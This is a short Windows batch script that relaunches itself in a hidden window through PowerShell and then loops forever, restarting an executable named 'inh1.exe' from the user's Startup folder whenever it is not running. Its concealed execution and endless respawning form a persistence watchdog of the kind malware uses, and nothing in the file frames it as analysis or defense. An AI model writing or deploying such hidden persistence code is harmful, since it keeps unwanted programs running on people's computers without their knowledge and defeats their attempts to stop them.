@echo off

:: If not already hidden, relaunch self hidden via PowerShell
if "%1" neq "hidden" (
    powershell -windowstyle hidden -command "Start-Process '%~f0' -ArgumentList 'hidden' -WindowStyle Hidden"
    exit
)

:l
tasklist /fi "imagename eq inh1.exe" | find /i "inh1.exe" >nul
if errorlevel 1 (
    timeout /t 5 /nobreak >nul
    start "" "%USERPROFILE%\AppData\Roaming\Microsoft\Windows\Start Menu\Programs\Startup\inh1.exe"
)
goto l